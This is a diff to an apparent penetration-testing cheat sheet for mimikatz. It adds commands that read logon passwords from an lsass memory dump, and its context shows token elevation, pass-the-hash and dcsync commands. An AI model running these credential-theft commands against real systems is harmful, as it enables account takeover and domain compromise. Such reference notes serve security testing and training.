@@ -24,7 +24,6 @@ Download from: https://github.com/ParrotSec/mimikatz.git
 
 ## Basic usage
 
-
 ```bash
 # Impersonate as NT Authority/SYSTEM (having permissions for it).
 token::elevate
@@ -47,6 +46,17 @@ mimikatz.exe privilege::debug "sekurlsa::pth /user:<username> /rc4:<NTLM hash> /
 
 # Run a dcsync attack:
 .\mimikatz.exe privilege::debug "lsadump::dcsync /domain:$domain /user:Administrator" exit
+
+#####
+# Analyze a lsaass dump file:
+#####
+# Using 'mimikatz.log' for logfile
+mimikatz # log
+# Switch to MINIDUMP : 'lsass.dmp'
+mimikatz # sekurlsa::minidump lsass.dmp
+# Opening : 'lsass.dmp' file for minidump...
+mimikatz # sekurlsa::logonpasswords
+###########
 ```
 
 
